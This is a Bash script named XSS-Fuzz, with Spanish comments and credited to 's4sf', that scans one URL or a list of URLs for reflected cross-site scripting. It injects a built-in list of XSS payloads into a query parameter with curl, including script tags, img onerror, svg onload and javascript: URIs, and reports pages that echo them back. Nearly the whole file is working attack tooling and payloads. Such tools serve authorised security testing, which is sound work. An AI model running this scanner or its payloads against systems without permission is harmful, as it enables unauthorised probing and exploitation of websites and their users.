#!/usr/bin/env bash

# ============================================================
#  XSS-Fuzz — Reflected XSS quick scanner
#  Created by s4sf  |  Cyberpunk banner 
# ============================================================

# Colores (desactivables con --no-colors)
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
NC='\033[0m'
USE_COLORS=1

banner() {
  [[ "$USE_COLORS" -eq 1 ]] && echo -e "${CYAN}" || true
  cat <<'BANNER'
  ____  ____    _____ _____ ____    ____                      
 |___ \|___ \  |___  |___  |___ \  |___ \   _   _  ___  ___ 
   __) | __) |    / /   / /   __) |   __) | | | |/ _ \/ __|
  / __/ / __/    / /   / /   / __/   / __/  | |_| |  __/\__ \
 |_____||_____|  /_/   /_/   |_____| |_____|  \__, |\___||___/
                                               |___/         
  ----------------------------------------
            Created by s4sf
  ----------------------------------------
BANNER
  [[ "$USE_COLORS" -eq 1 ]] && echo -e "${NC}" || true
}

usage() {
  cat <<EOF
Uso:
  $0 -u URL | -f archivo.txt [opciones]

Opciones:
  -u, --url URL           URL objetivo
  -f, --file FILE         Archivo con URLs (una por línea)
  -p, --param NAME        Nombre del parámetro a inyectar (def: xss_test)
  -A, --agent UA          User-Agent personalizado
  -T, --timeout SEC       Timeout por petición (def: 15)
      --no-colors         Desactiva colores en la salida
  -h, --help              Muestra esta ayuda

Ejemplos:
  $0 -u "https://site.com/search?q=hola"
  $0 -f urls.txt -p query -A "Mozilla/5.0" -T 30
EOF
}

# Defaults
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"
PARAM_NAME="xss_test"
TIMEOUT=15
TARGET=""
FILE=""

# Payloads base (mantengo los tuyos y añado alguno seguro)
PAYLOADS=(
  "<script>alert('XSS')</script>"
  "\" onerror=\"alert('XSS')\""
  "' onmouseover='alert(\"XSS\")'"
  "<img src=x onerror=alert('XSS')>"
  "<svg onload=alert('XSS')>"
  "javascript:alert('XSS')"
  "data:text/javascript,alert('XSS')"
  "<ScRiPt>alert('XSS')</ScRiPt>"
  "test123\"><h1>TESTXSS</h1>"
  "\"><svg/onload=alert('XSS')>"          # extra común
)

# URL-encode sencillo para los caracteres clave
urlencode() {
  # Encode espacios, comillas, <, >, &, ', # (suficiente para estos payloads)
  local s="$1"
  s="${s// /%20}"
  s="${s//\"/%22}"
  s="${s//\'/%27}"
  s="${s//</%3C}"
  s="${s//>/%3E}"
  s="${s//&/%26}"
  s="${s//#/%23}"
  printf '%s' "$s"
}

have_params() {
  [[ "$1" == *"?"* ]] && return 0 || return 1
}

# Señales
trap 'echo; echo "[-] Interrumpido por el usuario."; exit 130' INT

# Parseo de argumentos
while [[ $# -gt 0 ]]; do
  case "$1" in
    -u|--url)    TARGET="$2"; shift 2;;
    -f|--file)   FILE="$2"; shift 2;;
    -p|--param)  PARAM_NAME="$2"; shift 2;;
    -A|--agent)  USER_AGENT="$2"; shift 2;;
    -T|--timeout) TIMEOUT="$2"; shift 2;;
    --no-colors) USE_COLORS=0; shift;;
    -h|--help)   usage; exit 0;;
    *) echo "Opción desconocida: $1"; usage; exit 1;;
  esac
done

# Validaciones
if [[ -z "$TARGET" && -z "$FILE" ]]; then
  echo "[-] Debes indicar -u URL o -f archivo."; usage; exit 1
fi
if [[ -n "$TARGET" && -n "$FILE" ]]; then
  echo "[-] Usa -u o -f, pero no ambos."; usage; exit 1
fi
if [[ -n "$FILE" && ! -f "$FILE" ]]; then
  echo "[-] El archivo '$FILE' no existe."; exit 1
fi

# Colores condicionales
color() {
  local code="$1"; shift
  if [[ "$USE_COLORS" -eq 1 ]]; then echo -e "${code}$*${NC}"; else echo "$*"; fi
}

test_url() {
  local URL="$1"
  color "$YELLOW" "[+] Probando: $URL"

  local SEP="?"
  have_params "$URL" && SEP="&"

  for PAYLOAD in "${PAYLOADS[@]}"; do
    local ENCODED
    ENCODED="$(urlencode "$PAYLOAD")"
    local FINAL_URL="${URL}${SEP}${PARAM_NAME}=${ENCODED}"

    # Petición HTTP
    local RESPONSE
    RESPONSE="$(curl -sS -L --max-time "$TIMEOUT" -A "$USER_AGENT" "$FINAL_URL" || true)"

    # Detección
    if echo "$RESPONSE" | grep -qi -- "$PAYLOAD"; then
      color "$GREEN" "[!] Posible XSS encontrado:"
      echo "Payload: $PAYLOAD"
      echo "URL: $FINAL_URL"
      echo "----------------------------------------"
    elif echo "$RESPONSE" | grep -qi "TESTXSS"; then
      color "$GREEN" "[!] Reflexión encontrada:"
      echo "Payload: TESTXSS"
      echo "URL: $FINAL_URL"
      echo "----------------------------------------"
    fi
  done
}

main() {
  banner
  if [[ -n "$TARGET" ]]; then
    test_url "$TARGET"
  else
    # Lee archivo ignorando líneas vacías y comentarios (#)
    while IFS= read -r LINE; do
      [[ -z "$LINE" ]] && continue
      [[ "$LINE" =~ ^[[:space:]]*# ]] && continue
      test_url "$LINE"
    done < "$FILE"
  fi
}

main
